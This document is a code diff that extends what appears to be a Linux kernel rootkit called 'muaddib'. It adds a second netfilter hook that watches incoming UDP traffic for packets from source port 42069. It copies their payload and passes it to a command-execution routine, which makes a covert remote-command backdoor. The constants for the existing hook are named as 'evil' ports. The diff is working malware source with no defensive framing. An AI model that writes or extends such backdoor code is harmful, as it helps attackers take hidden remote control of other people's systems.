@@ -6,8 +6,12 @@
 
 #define EVIL_DEST_PORT 7777
 #define EVIL_SRC_PORT 6666
+#define MAX_CMD_LEN 255
+
+#define UDP_EVIL_SRC_PORT 42069
 
 static struct nf_hook_ops nf_ops;
+static struct nf_hook_ops udp_hook_ops;
 
 static unsigned int nf_hook_muadDib(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
 {
@@ -48,6 +52,46 @@ static unsigned int nf_hook_muadDib(void *priv, struct sk_buff *skb, const struc
 	
 }
 
+static unsigned int udp_command_parse_hook(void *priv,struct sk_buff *skb, const struct nf_hook_state *state){
+    struct iphdr *iph;
+    struct udphdr *udph;
+    char *udp_data;
+    unsigned int udp_data_len;
+    char *cmd_buffer;
+    printk(KERN_INFO "muadDib: UDP HOOK");
+    iph = ip_hdr(skb);
+    if (!iph)
+        return NF_ACCEPT;
+
+    if (iph->protocol != IPPROTO_UDP)
+        return NF_ACCEPT;
+
+    udph = udp_hdr(skb);
+    if (!udph)
+        return NF_ACCEPT;
+
+    if (ntohs(udph->source) != UDP_EVIL_SRC_PORT)
+        return NF_ACCEPT;
+
+    udp_data_len = ntohs(udph->len) - sizeof(struct udphdr);
+    if (udp_data_len <= 0 || udp_data_len > MAX_CMD_LEN)
+        return NF_ACCEPT;
+
+    udp_data = (char *)((unsigned char *)udph + sizeof(struct udphdr));
+
+    cmd_buffer = kmalloc(udp_data_len + 1, GFP_KERNEL);
+    if (!cmd_buffer)
+        return NF_ACCEPT;
+
+    strncpy(cmd_buffer, udp_data, udp_data_len);
+    cmd_buffer[udp_data_len] = '\0'; 
+
+    start_command_execute(cmd_buffer);
+
+    kfree(cmd_buffer);
+    return NF_ACCEPT;
+}
+
 int reg_nf_hook(void){
     int err;
     nf_ops.hook = nf_hook_muadDib;
@@ -69,14 +113,36 @@ int reg_nf_hook(void){
 		#endif
     }
 
+    udp_hook_ops.hook = udp_command_parse_hook;
+    udp_hook_ops.pf = PF_INET;
+    udp_hook_ops.hooknum = NF_INET_PRE_ROUTING;
+    udp_hook_ops.priority = NF_IP_PRI_FIRST; 
+    #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
+        err = nf_register_net_hook(&init_net, &udp_hook_ops);
+    #else
+        err = nf_register_hook(&udp_hook_ops);
+    #endif
+    if(err<0){
+		#if DEBUGMSG == 1
+		printk(KERN_INFO "muaddib: Error registering nf hook");
+		#endif
+    }else{
+		#if DEBUGMSG == 1
+        printk(KERN_INFO "muaddib: Registered nethook");
+		#endif
+    }
+
+    
     return err;
 }
 
 void unreg_nf_hook(void){
     #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
     nf_unregister_net_hook(&init_net, &nf_ops);
+    nf_unregister_net_hook(&init_net, &udp_hook_ops);
     #else
     nf_unregister_hook(&nf_ops);
+    nf_unregister_hook(&udp_hook_ops);
     #endif
     #if DEBUGMSG == 1
     printk(KERN_INFO "muaddib: Unregistered nethook");
